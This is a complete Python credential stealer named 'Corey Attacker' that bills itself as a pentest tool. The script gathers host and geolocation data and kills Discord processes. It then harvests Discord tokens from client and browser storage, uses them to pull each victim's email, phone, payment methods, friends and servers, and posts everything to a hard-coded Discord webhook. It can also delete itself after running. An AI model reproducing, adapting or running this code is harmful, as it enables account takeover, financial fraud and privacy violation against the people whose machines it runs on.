import os
import re
import json
import platform
import sqlite3
import shutil
import subprocess
import time
import uuid
import socket
import requests
import base64
import struct
import sys
from pathlib import Path
from datetime import datetime

# ============================================================
# CONFIGURATION — Replace with your Discord webhook URL
# ============================================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1519234728870543390/vuwwQHycSoyCGnCInQLz9uoCEcaZjP7mqHG8RNE4N7s0wjkADdV4n8c_t7j2-TUboVxM"
SELF_DESTRUCT = False  # Set to True to delete Corey Attacker after execution

# ============================================================
# ASCII ART
# ============================================================
BANNER = """
   ______                      __        __    _   __
  / ____/___  ____  _________ _/ /_      / /   (_) / /____  _____
 / /   / __ \/ __ \/ ___/ __ `/ __/_____/ /   / / / __/ _ \/ ___/
/ /___/ /_/ / / / (__  ) /_/ / /_/_____/ /___/ / / /_/  __/ /
\____/\____/_/ /_/____/\__,_/\__/     /_____/_/_\__/\___/_/
                                                         v2.0
              🕵️  Authorized Pentest Intel Gatherer
"""

# ============================================================
# PHASE 1: SYSTEM INTELLIGENCE
# ============================================================
class SystemIntel:
    @staticmethod
    def gather():
        info = {
            "hostname": platform.node(),
            "os": f"{platform.system()} {platform.release()}",
            "os_version": platform.version(),
            "username": os.getenv("USERNAME") or os.getenv("USER") or "unknown",
            "machine": platform.machine(),
            "processor": platform.processor() or platform.machine(),
            "local_ip": "unknown",
            "mac_address": "unknown",
            "public_ip": "unknown",
            "city": "unknown",
            "region": "unknown",
            "country": "unknown",
            "isp": "unknown",
            "lat": "?",
            "lon": "?",
            "boot_time": "unknown"
        }
        
        # Local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info["local_ip"] = s.getsockname()[0]
            s.close()
        except:
            pass
        
        # MAC address
        try:
            mac = uuid.getnode()
            info["mac_address"] = ':'.join(['{:02x}'.format((mac >> elements) & 0xff) 
                                           for elements in range(0, 2*6, 2)][::-1])
        except:
            pass
        
        # Public IP & geolocation
        try:
            r = requests.get("https://api.ipify.org?format=json", timeout=5)
            info["public_ip"] = r.json().get("ip", "unknown")
        except:
            pass
        
        try:
            r = requests.get(f"https://ipapi.co/{info['public_ip']}/json/", timeout=5)
            geo = r.json()
            info.update({
                "city": geo.get("city", "unknown"),
                "region": geo.get("region", "unknown"),
                "country": geo.get("country_name", "unknown"),
                "isp": geo.get("org", geo.get("isp", "unknown")),
                "lat": geo.get("latitude", "?"),
                "lon": geo.get("longitude", "?")
            })
        except:
            pass
        
        # Boot time
        try:
            if platform.system() == "Darwin":
                output = subprocess.check_output(["sysctl", "-n", "kern.boottime"], timeout=5).decode()
                boot_sec = output.split("sec = ")[1].split(",")[0]
                info["boot_time"] = datetime.fromtimestamp(int(boot_sec)).isoformat()
            elif platform.system() == "Linux":
                with open("/proc/stat") as f:
                    for line in f:
                        if line.startswith("btime"):
                            info["boot_time"] = datetime.fromtimestamp(int(line.split()[1])).isoformat()
                            break
            elif platform.system() == "Windows":
                output = subprocess.check_output(["systeminfo", "|", "find", "/i", "boot time"], shell=True, timeout=5).decode()
                info["boot_time"] = output.strip()
        except:
            pass
        
        return info

# ============================================================
# PHASE 2: DISCORD TOKEN EXTRACTION
# ============================================================
class DiscordTokenHunter:
    TOKEN_PATTERN = re.compile(rb'[MN][A-Za-z0-9_-]{23,26}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,}')
    TOKEN_PATTERN_STR = re.compile(r'[MN][A-Za-z0-9_-]{23,26}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,}')
    
    @staticmethod
    def get_leveldb_paths():
        system = platform.system()
        paths = []
        home = str(Path.home())
        
        if system == "Windows":
            appdata = os.getenv("APPDATA", "")
            localappdata = os.getenv("LOCALAPPDATA", "")
            # Discord clients
            discord_clients = ["discord", "discordcanary", "discordptb", "discorddevelopment"]
            for client in discord_clients:
                ldb = os.path.join(appdata, client, "Local Storage", "leveldb")
                if os.path.exists(ldb):
                    paths.append((ldb, f"Discord {client}"))
            
            # Browsers that might have Discord web tokens
            browser_profiles = [
                (os.path.join(localappdata, "Google", "Chrome", "User Data"), "Chrome"),
                (os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"), "Brave"),
                (os.path.join(localappdata, "Microsoft", "Edge", "User Data"), "Edge"),
                (os.path.join(localappdata, "Vivaldi", "User Data"), "Vivaldi"),
                (os.path.join(localappdata, "Opera Software", "Opera Stable"), "Opera"),
                (os.path.join(localappdata, "Opera Software", "Opera GX Stable"), "Opera GX"),
            ]
            
            for base, name in browser_profiles:
                if os.path.exists(base):
                    # Check default profile and numbered profiles
                    for item in os.listdir(base):
                        ldb = os.path.join(base, item, "Local Storage", "leveldb")
                        if os.path.exists(ldb):
                            paths.append((ldb, f"{name} ({item})"))
        
        elif system == "Darwin":  # macOS
            discord_clients = ["discord", "discordcanary", "discordptb", "discorddevelopment"]
            for client in discord_clients:
                ldb = os.path.join(home, "Library", "Application Support", client, "Local Storage", "leveldb")
                if os.path.exists(ldb):
                    paths.append((ldb, f"Discord {client}"))
            
            # Browser paths for macOS
            browser_paths = [
                (os.path.join(home, "Library", "Application Support", "Google", "Chrome"), "Chrome"),
                (os.path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser"), "Brave"),
                (os.path.join(home, "Library", "Application Support", "Microsoft Edge"), "Edge"),
                (os.path.join(home, "Library", "Application Support", "Vivaldi"), "Vivaldi"),
            ]
            for base, name in browser_paths:
                if os.path.exists(base):
                    profiles = os.listdir(base)
                    for profile in profiles:
                        ldb = os.path.join(base, profile, "Local Storage", "leveldb")
                        if os.path.exists(ldb):
                            paths.append((ldb, f"{name} ({profile})"))
        
        elif system == "Linux":
            discord_clients = ["discord", "discordcanary", "discordptb", "discorddevelopment"]
            for client in discord_clients:
                ldb = os.path.join(home, ".config", client, "Local Storage", "leveldb")
                if os.path.exists(ldb):
                    paths.append((ldb, f"Discord {client}"))
            
            # Browser paths for Linux
            browser_paths = [
                (os.path.join(home, ".config", "google-chrome"), "Chrome"),
                (os.path.join(home, ".config", "brave"), "Brave"),
                (os.path.join(home, ".config", "microsoft-edge"), "Edge"),
                (os.path.join(home, ".config", "vivaldi"), "Vivaldi"),
            ]
            for base, name in browser_paths:
                if os.path.exists(base):
                    profiles = os.listdir(base)
                    for profile in profiles:
                        ldb = os.path.join(base, profile, "Local Storage", "leveldb")
                        if os.path.exists(ldb):
                            paths.append((ldb, f"{name} ({profile})"))
        
        return paths
    
    @staticmethod
    def scan_leveldb(ldb_path, source_name):
        """Scan a LevelDB directory for Discord tokens"""
        tokens = set()
        if not os.path.isdir(ldb_path):
            return tokens
        
        for fname in os.listdir(ldb_path):
            fpath = os.path.join(ldb_path, fname)
            if not os.path.isfile(fpath):
                continue
            
            # Only scan .ldb and .log files
            if not (fname.endswith('.ldb') or fname.endswith('.log')):
                continue
            
            try:
                with open(fpath, 'rb') as f:
                    data = f.read()
                matches = DiscordTokenHunter.TOKEN_PATTERN.findall(data)
                for m in matches:
                    try:
                        token = m.decode('utf-8')
                        tokens.add(token)
                    except:
                        pass
            except (PermissionError, OSError):
                pass
        
        return tokens
    
    @staticmethod
    def hunt():
        print("[*] Corey Attacker: Hunting for Discord tokens...")
        all_tokens = set()
        sources = []
        
        # Step 1: Kill Discord processes to unlock LevelDB files
        system = platform.system()
        discord_processes = ["discord", "discordcanary", "discordptb", "discorddevelopment"]
        killed = []
        
        try:
            if system == "Windows":
                output = subprocess.check_output("tasklist", shell=True).decode().lower()
                for proc in discord_processes:
                    if proc in output:
                        subprocess.run(["taskkill", "/F", "/IM", f"{proc}.exe"], 
                                      capture_output=True, timeout=5)
                        killed.append(proc)
            elif system == "Darwin":
                output = subprocess.check_output(["ps", "aux"], timeout=5).decode().lower()
                for proc in discord_processes:
                    if proc in output:
                        subprocess.run(["pkill", "-f", proc], capture_output=True, timeout=5)
                        killed.append(proc)
            elif system == "Linux":
                output = subprocess.check_output(["ps", "aux"], timeout=5).decode().lower()
                for proc in discord_processes:
                    if proc in output:
                        subprocess.run(["pkill", "-f", proc], capture_output=True, timeout=5)
                        killed.append(proc)
        except:
            pass
        
        if killed:
            print(f"  [!] Killed Discord processes: {killed}")
            time.sleep(1)  # Wait for file locks to release
        
        # Step 2: Scan all paths
        paths = DiscordTokenHunter.get_leveldb_paths()
        print(f"  [*] Scanning {len(paths)} storage locations...")
        
        for ldb_path, source_name in paths:
            tokens = DiscordTokenHunter.scan_leveldb(ldb_path, source_name)
            if tokens:
                all_tokens.update(tokens)
                sources.append((source_name, len(tokens)))
                print(f"  [+] Found {len(tokens)} token(s) in {source_name}")
        
        return list(all_tokens), sources, killed

# ============================================================
# PHASE 3: TOKEN VALIDATION & DISCORD API DATA
# ============================================================
class DiscordAPIClient:
    BASE = "https://discord.com/api/v9"
    
    def __init__(self, token):
        self.token = token
        self.headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
    
    def get_profile(self):
        try:
            r = requests.get(f"{self.BASE}/users/@me", headers=self.headers, timeout=10)
            if r.status_code == 200:
                return r.json()
            return None
        except:
            return None
    
    def get_billing(self):
        try:
            r = requests.get(f"{self.BASE}/users/@me/billing/payment-sources", 
                           headers=self.headers, timeout=10)
            if r.status_code == 200:
                return r.json()
            return None
        except:
            return None
    
    def get_subscriptions(self):
        try:
            r = requests.get(f"{self.BASE}/users/@me/billing/subscriptions", 
                           headers=self.headers, timeout=10)
            if r.status_code == 200:
                return r.json()
            return None
        except:
            return None
    
    def get_relationships(self):
        """Get friends list"""
        try:
            r = requests.get(f"{self.BASE}/users/@me/relationships", 
                           headers=self.headers, timeout=10)
            if r.status_code == 200:
                return r.json()
            return None
        except:
            return None
    
    def get_guilds(self):
        """Get servers the user is in"""
        try:
            r = requests.get(f"{self.BASE}/users/@me/guilds", 
                           headers=self.headers, timeout=10)
            if r.status_code == 200:
                return r.json()
            return None
        except:
            return None
    
    def get_connections(self):
        """Get connected accounts (Spotify, YouTube, etc.)"""
        try:
            r = requests.get(f"{self.BASE}/users/@me/connections", 
                           headers=self.headers, timeout=10)
            if r.status_code == 200:
                return r.json()
            return None
        except:
            return None

# ============================================================
# PHASE 4: BUILD & SEND INTELLIGENCE REPORT
# ============================================================
class IntelReport:
    @staticmethod
    def build(system_info, token, profile, billing, subs, relationships, guilds, connections, sources, killed):
        fields = []
        
        # ===== TOKEN =====
        if token:
            # Truncated display but full token in the value
            fields.append({
                "name": "🔑 Discord Token",
                "value": f"```\n{token}\n```\n**Length:** {len(token)} chars\n**Status:** ✅ Valid",
                "inline": False
            })
        
        # ===== IP & LOCATION =====
        fields.append({
            "name": "🌐 IP & Geolocation",
            "value": f"**Public IP:** {system_info['public_ip']}\n"
                     f"**Local IP:** {system_info['local_ip']}\n"
                     f"**MAC Address:** {system_info['mac_address']}\n"
                     f"**ISP:** {system_info['isp']}\n"
                     f"**City:** {system_info['city']}\n"
                     f"**Region:** {system_info['region']}\n"
                     f"**Country:** {system_info['country']}\n"
                     f"**Coordinates:** {system_info['lat']}, {system_info['lon']}",
            "inline": True
        })
        
        # ===== SYSTEM =====
        fields.append({
            "name": "💻 System Intelligence",
            "value": f"**Hostname:** {system_info['hostname']}\n"
                     f"**Username:** {system_info['username']}\n"
                     f"**OS:** {system_info['os']}\n"
                     f"**OS Version:** {system_info['os_version']}\n"
                     f"**Machine:** {system_info['machine']}\n"
                     f"**Processor:** {system_info['processor']}\n"
                     f"**Boot Time:** {system_info['boot_time']}",
            "inline": True
        })
        
        # ===== THREAT DATA =====
        threat_info = f"**Killed Processes:** {', '.join(killed) if killed else 'None'}\n"
        threat_info += f"**Token Sources:** {len(sources)} location(s)\n"
        for src, count in sources:
            threat_info += f"  • {src}: {count} token(s)\n"
        
        fields.append({
            "name": "🎯 Threat Intelligence",
            "value": threat_info,
            "inline": False
        })
        
        # ===== DISCORD PROFILE =====
        if profile:
            nitro_map = {0: '❌ None', 1: '✅ Classic', 2: '✅ Nitro', 3: '✅ Basic'}
            flags = []
            if profile.get('verified') is True:
                flags.append("Verified Email")
            if profile.get('mfa_enabled') is True:
                flags.append("2FA Enabled")
            if profile.get('nsfw_allowed') is True:
                flags.append("NSFW Allowed")
            if profile.get('premium_type', 0) > 0:
                flags.append("Nitro Subscriber")
            
            profile_info = f"**Username:** {profile['username']}#{profile.get('discriminator', '0')}\n"
            profile_info += f"**User ID:** {profile['id']}\n"
            profile_info += f"**Display Name:** {profile.get('global_name', 'N/A')}\n"
            profile_info += f"**Email:** {profile.get('email', '❌ Hidden')}\n"
            profile_info += f"**Phone:** {profile.get('phone', '❌ None')}\n"
            profile_info += f"**Nitro:** {nitro_map.get(profile.get('premium_type', 0), 'Unknown')}\n"
            profile_info += f"**MFA:** {'✅ Enabled' if profile.get('mfa_enabled') else '❌ Disabled'}\n"
            profile_info += f"**Verified:** {'✅ Yes' if profile.get('verified') else '❌ No'}\n"
            profile_info += f"**Locale:** {profile.get('locale', 'unknown')}\n"
            profile_info += f"**Flags:** {', '.join(flags) if flags else 'None'}\n"
            profile_info += f"**Creation Date:** <t:{((int(profile['id']) >> 22) + 1420070400000) // 1000}:R>\n"
            profile_info += f"**Bio:** {(profile.get('bio') or 'None')[:200]}"
            
            fields.append({
                "name": "👤 Discord Profile",
                "value": profile_info,
                "inline": False
            })
        
        # ===== BILLING / PAYMENT METHODS =====
        if billing and len(billing) > 0:
            billing_lines = []
            for i, p in enumerate(billing, 1):
                if p.get('type') == 1:  # Credit/Debit Card
                    addr = p.get('billing_address', {})
                    card_info = (
                        f"**Card #{i}:** 💳 {p.get('brand', 'Card')}\n"
                        f"  • Number: •••• {p.get('last4', '????')}\n"
                        f"  • Expires: {p.get('expires_month', '??')}/{p.get('expires_year', '??')}\n"
                        f"  • Billing Name: {addr.get('name', 'N/A')}\n"
                        f"  • Address: {addr.get('line1', 'N/A')}\n"
                        f"  • City: {addr.get('city', 'N/A')}\n"
                        f"  • State: {addr.get('state', 'N/A')}\n"
                        f"  • ZIP: {addr.get('postal_code', 'N/A')}\n"
                        f"  • Country: {addr.get('country', 'N/A')}\n"
                        f"  • Default: {'✅ Yes' if p.get('default') else '❌ No'}\n"
                        f"  • Status: {'⚠️ INVALID' if p.get('invalid') else '✅ VALID'}"
                    )
                    billing_lines.append(card_info)
                    
                elif p.get('type') == 2:  # PayPal
                    billing_lines.append(
                        f"**Payment #{i}:** 💵 PayPal\n"
                        f"  • Email: {p.get('email', p.get('paypal_email', 'Linked'))}\n"
                        f"  • Default: {'✅ Yes' if p.get('default') else '❌ No'}\n"
                        f"  • Status: {'⚠️ INVALID' if p.get('invalid') else '✅ VALID'}"
                    )
            
            fields.append({
                "name": f"💳 Payment Methods ({len(billing)})",
                "value": "\n\n".join(billing_lines)[:1024],
                "inline": False
            })
        elif profile:
            fields.append({
                "name": "💳 Payment Methods",
                "value": "No payment sources linked to this account.",
                "inline": False
            })
        
        # ===== SUBSCRIPTIONS =====
        if subs and len(subs) > 0:
            sub_lines = []
            for s in subs:
                sub_lines.append(
                    f"**{s.get('name', 'Subscription')}**\n"
                    f"  • Status: {s.get('status', 'unknown')}\n"
                    f"  • Started: {s.get('current_period_start', '?')}\n"
                    f"  • Renews: {s.get('current_period_end', '?')}\n"
                    f"  • Cancelled: {s.get('canceled_at', 'No') if s.get('canceled_at') else 'No'}"
                )
            fields.append({
                "name": "📦 Subscriptions",
                "value": "\n\n".join(sub_lines)[:1024],
                "inline": False
            })
        
        # ===== CONNECTED ACCOUNTS =====
        if connections and len(connections) > 0:
            conn_lines = [f"  • {c.get('type', '?')}: {c.get('name', '?')}" for c in connections[:10]]
            fields.append({
                "name": f"🔗 Connected Accounts ({len(connections)})",
                "value": "\n".join(conn_lines)[:1024],
                "inline": True
            })
        
        # ===== GUILDS (Servers) =====
        if guilds and len(guilds) > 0:
            guild_lines = [f"  • {g.get('name', '?')} (ID: {g.get('id', '?')})" for g in guilds[:10]]
            guilds_text = "\n".join(guild_lines)
            if len(guilds) > 10:
                guilds_text += f"\n  • ... and {len(guilds) - 10} more"
            fields.append({
                "name": f"📋 Servers ({len(guilds)})",
                "value": guilds_text[:1024],
                "inline": True
            })
        
        # ===== FRIENDS =====
        if relationships and len(relationships) > 0:
            friend_count = len(relationships)
            fields.append({
                "name": "👥 Friends",
                "value": f"Total friends: {friend_count}",
                "inline": True
            })
        
        # Build embed
        embed = {
            "title": "🕵️ Corey Attacker — Full Intelligence Report",
            "description": f"Target: {system_info['username']}@{system_info['hostname']}",
            "color": 0xed4245,
            "fields": fields,
            "footer": {"text": f"Corey Attacker v2.0 | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC"},
            "timestamp": datetime.utcnow().isoformat()
        }
        
        # Add thumbnail if profile has avatar
        if profile and profile.get('avatar'):
            avatar_hash = profile['avatar']
            user_id = profile['id']
            ext = 'gif' if avatar_hash.startswith('a_') else 'png'
            embed["thumbnail"] = {
                "url": f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.{ext}"
            }
        
        return embed
    
    @staticmethod
    def send(embed):
        payload = {
            "embeds": [embed],
            "username": "Corey Attacker",
            "avatar_url": "https://cdn.discordapp.com/embed/avatars/4.png"
        }
        
        try:
            r = requests.post(WEBHOOK_URL, json=payload, timeout=10)
            if r.status_code == 204 or r.status_code == 200:
                print("[+] ✅ Intelligence report sent successfully!")
                return True
            else:
                print(f"[-] Webhook returned status {r.status_code}: {r.text[:200]}")
                return False
        except Exception as e:
            print(f"[-] Failed to send webhook: {e}")
            return False

# ============================================================
# MAIN EXECUTION
# ============================================================
def main():
    print(BANNER)
    print(f"[*] Corey Attacker initialized at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Target: {platform.node()}")
    print(f"[*] OS: {platform.system()} {platform.release()}")
    print("=" * 60)
    
    # Phase 1: System Intelligence
    print("\n[📡] Phase 1: Gathering system intelligence...")
    system_info = SystemIntel.gather()
    print(f"  [+] Hostname: {system_info['hostname']}")
    print(f"  [+] Username: {system_info['username']}")
    print(f"  [+] IP: {system_info['public_ip']} (local: {system_info['local_ip']})")
    print(f"  [+] Location: {system_info['city']}, {system_info['region']}, {system_info['country']}")
    
    # Phase 2: Token Hunting
    print("\n[🎯] Phase 2: Hunting Discord tokens...")
    tokens, sources, killed = DiscordTokenHunter.hunt()
    
    if not tokens:
        print("[-] No tokens found. Sending system info only.")
        embed = IntelReport.build(system_info, None, None, None, None, None, None, None, sources, killed)
        IntelReport.send(embed)
        return
    
    print(f"\n[+] Found {len(tokens)} unique token(s)!")
    
    # Phase 3: Validate tokens & gather Discord data
    print("\n[🔍] Phase 3: Validating tokens and gathering Discord data...")
    
    for token in tokens:
        client = DiscordAPIClient(token)
        profile = client.get_profile()
        
        if profile:
            print(f"  [+] ✅ Valid token for {profile['username']}#{profile.get('discriminator', '0')}")
            print(f"  [+] Email: {profile.get('email', 'hidden')}")
            print(f"  [+] Phone: {profile.get('phone', 'none')}")
            print(f"  [+] MFA: {'Enabled' if profile.get('mfa_enabled') else 'Disabled'}")
            print(f"  [+] Nitro: {['None', 'Classic', 'Nitro', 'Basic'][profile.get('premium_type', 0)]}")
            
            print(f"  [*] Fetching billing info...")
            billing = client.get_billing()
            if billing:
                cards = [p for p in billing if p.get('type') == 1]
                paypal = [p for p in billing if p.get('type') == 2]
                print(f"  [+] Found {len(cards)} card(s), {len(paypal)} PayPal(s)")
            else:
                print(f"  [-] No billing data available")
            
            print(f"  [*] Fetching subscriptions...")
            subs = client.get_subscriptions()
            
            print(f"  [*] Fetching relationships...")
            relationships = client.get_relationships()
            
            print(f"  [*] Fetching guilds...")
            guilds = client.get_guilds()
            
            print(f"  [*] Fetching connections...")
            connections = client.get_connections()
            
            print(f"\n[📤] Phase 4: Building and sending intelligence report...")
            embed = IntelReport.build(system_info, token, profile, billing, subs, 
                                     relationships, guilds, connections, sources, killed)
            IntelReport.send(embed)
            
            # Only process first valid token
            break
        else:
            print(f"  [-] Invalid token: {token[:30]}...")
    
    # Self-destruct
    if SELF_DESTRUCT:
        print("\n[💥] Self-destruct initiated...")
        try:
            script_path = os.path.abspath(__file__)
            os.remove(script_path)
            print("[+] Corey Attacker has been deleted.")
        except:
            print("[-] Could not delete Corey Attacker. Manual removal required.")
    
    print("\n[✔] Corey Attacker mission complete.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[-] Corey Attacker terminated by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Corey Attacker encountered an error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
